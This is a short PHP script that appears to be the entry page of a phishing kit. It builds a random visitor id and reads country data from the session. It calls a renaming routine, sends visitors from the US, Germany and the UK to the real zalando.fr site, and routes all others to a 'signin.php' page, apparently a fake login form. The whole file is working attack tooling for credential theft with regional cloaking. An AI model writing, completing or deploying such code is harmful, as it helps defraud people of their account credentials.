<?php
//---------------------------------------------------------------------------------------- INC
	include('./includes/funciones.php');
	include('./includes/lang.php');
//--------------------'-------------------------------------------------------------------- VAR
	$An = 'id='.rand(99, 100000000);
	$xcod = (empty($_SESSION['AYCOUNTCODE'])) ? '' : 'code='.$_SESSION['AYCOUNTCODE'].'&';
	$xbla = (empty($_SESSION['AYCOUNT'])) ? '' : '&country='.$_SESSION['AYCOUNT'];
//---------------------------------------------------------------------------------------- RNM
	Badal_smiya();
//---------------------------------------------------------------------------------------- FIN
if($country == "US" || $country == "DE" || $country == "UK"){
    header('location: https://zalando.fr/');
}
else{
    header('location: signin.php?'.$xcod.$An.$xbla);
}
?>

